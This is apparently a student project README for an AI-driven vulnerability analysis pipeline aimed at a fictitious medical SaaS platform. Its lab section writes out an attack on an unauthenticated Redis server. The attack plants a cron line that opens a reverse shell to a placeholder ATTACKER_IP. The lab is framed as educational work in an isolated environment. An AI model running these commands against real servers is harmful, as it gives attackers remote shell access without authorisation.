# VulnAI Management — Automated Security Analysis System

> **TP3 EFREI — RS3 S8 ARIR83** — Josselin KEIB, Mattéo LAUNAY  
> Système de gestion de vulnérabilités piloté par l'IA

## Overview

LLM-driven pipeline that ingests an architecture description and automatically:

1. **Parses** the architecture into structured components
2. **Identifies** vulnerabilities via LLM analysis (Claude / Llama3 / GPT-4o)
3. **Maps** each vulnerability to CVE entries via the NVD API
4. **Generates** MITRE ATT&CK kill chain scenarios
5. **Proposes** actionable, verifiable mitigations
6. **Exports** a JSON report + a professional HTML report

Target architecture: **MediConnect Corp** — fictitious medical SaaS platform.

## Project Structure

```
vuln_ai/
├── main.py                   # Pipeline entry point
├── parser/arch_parser.py     # Hybrid architecture parser (regex + LLM)
├── analyzer/llm_analyzer.py  # LLM vulnerability analyser
├── mapper/cve_mapper.py      # NVD API CVE enrichment
├── scenarios/attack_gen.py   # MITRE ATT&CK scenario generator
├── mitigations/mitigation_gen.py  # Actionable mitigation generator
└── output/report_builder.py  # JSON + HTML report builder

data/mediconnect_arch.txt     # MediConnect architecture description
lab/docker-compose.yml        # Lab environment for Scenario C (Redis)
config.yaml                   # LLM + NVD configuration
```

## Quick Start

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Configure API keys
cp .env.example .env
# Edit .env — add your ANTHROPIC_API_KEY

# 3. Run the full pipeline
python -m vuln_ai.main

# Options
python -m vuln_ai.main --skip-cve        # Skip NVD enrichment (faster)
python -m vuln_ai.main --skip-scenarios  # Skip attack scenario generation
python -m vuln_ai.main --arch path/to/custom_arch.txt
```

Reports are saved to `output/`:
- `output/report_raw.json` — machine-readable full report
- `output/report_mediconnect.html` — human-readable HTML report

## LLM Configuration

Edit `config.yaml`:

```yaml
llm:
  provider: anthropic   # anthropic | ollama | openai
  model: claude-sonnet-4-6
```

For local Ollama (privacy-preserving, recommended for real data):

```yaml
llm:
  provider: ollama
ollama:
  base_url: http://localhost:11434
  model: llama3:70b
```

## Lab — Scenario C (Redis Unauthenticated)

```bash
cd lab/
docker compose up -d

# Target: redis on localhost:6379 (no auth)
# Webapp: http://localhost:8080

# Attack steps (educational — isolated lab only):
redis-cli -h 127.0.0.1
CONFIG SET dir /tmp
CONFIG SET dbfilename shell.sh
SET x "*/1 * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
BGSAVE
```

## Legal Disclaimer

All techniques in this project are restricted to **isolated lab environments**.  
Exploiting real systems without explicit written authorisation is a criminal offence  
(Article 323-1 of the French Penal Code).
